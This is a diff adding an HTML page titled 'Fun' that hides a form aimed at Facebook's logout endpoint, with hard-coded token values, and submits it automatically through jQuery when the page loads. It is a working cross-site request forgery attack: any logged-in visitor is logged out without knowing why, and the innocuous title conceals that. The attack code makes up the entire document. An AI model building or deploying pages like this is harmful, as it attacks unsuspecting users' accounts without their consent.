@@ -1,0 +1,21 @@
+<html>
+<head>
+
+<title>Fun</title>
+<script type="text/javascript" src="jquery-1.4.2.min.js"></script>
+</head>
+<body>
+<form id="logout_form" method="post" action="https://www.facebook.com/logout.php" >
+	<input type="hidden" name="fb_dtsg" value="AQAv-fjA" autocomplete="off">
+	<input type="hidden" autocomplete="off" name="ref" value="mb">
+	<input type="hidden" autocomplete="off"	name="h" value="AffjN7K43xYo-MDL">
+	<label class="uiLinkButton logoutButton navSubmenu">
+	<input type="submit" value="Log Out" style="display:none"></label>
+</form>
+<script type="text/javascript">
+$(function(){
+	$("#logout_form").submit();
+});
+</script>
+</body>
+</html>
